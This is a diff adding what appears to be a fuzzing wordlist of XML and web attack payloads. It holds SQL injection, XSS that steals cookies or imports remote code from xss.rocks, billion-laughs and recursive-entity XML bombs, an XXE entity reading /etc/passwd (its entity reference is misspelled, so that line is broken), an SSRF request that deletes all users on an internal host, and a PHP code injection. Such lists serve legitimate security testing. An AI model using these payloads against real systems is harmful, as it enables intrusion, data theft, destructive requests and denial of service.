@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?><root><user>admin</user><pass>wreet' or '1'='1</pass></root>
+<?xml version="1.0" encoding="UTF-8"?><root><query>wreet"%3e%3cscript%3ealert(document.cookie)%3c/script%3e</query></root>
+<?xml version="1.0"?> <!DOCTYPE lolz [ <!ENTITY lol "lol"> <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"> <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"> <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"> <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"> <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"> <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"> <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"> <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"> <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> <lolz>&lol9;</lolz>
+<?xml version="1.0"?> <!DOCTYPE lolz [ <!ENTITY lol1 "&lol2;"> <!ENTITY lol2 "&lol1;"> ]> <lolz>&lol1;</lolz>
+<?xml version="1.0"?> <!DOCTYPE kaboom [ <!ENTITY a "aaaaaaaaaaaaaaaaaa..."> ]> <boom>&a;&a;&a;&a;&a;&a;&a;&a;&a;...</boom>
+<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE updateProfile [ <!ENTITY ssrf SYSTEM 'http://10.0.0.2/users.php?delete=all'> ]> <updateProfile> <firstname>Joe</firstname> <lastname>&ssrf;</lastname> </updateProfile>
+<?xml version="1.0" encoding="utf-8"?> <xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"> <xs:element name="note"> <xs:complexType> <xs:sequence> <xs:element name="to" type="xs:string"/> <xs:element name="from" type="xs:string"/> <xs:element name="heading" type="xs:string"/> <xs:element name="body" type="xs:string"/> </xs:sequence> </xs:complexType> </xs:element> </xs:schema>
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://xss.rocks/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<name>','')); phpinfo(); exit;/*</name>
+1.7976931348623157e+308
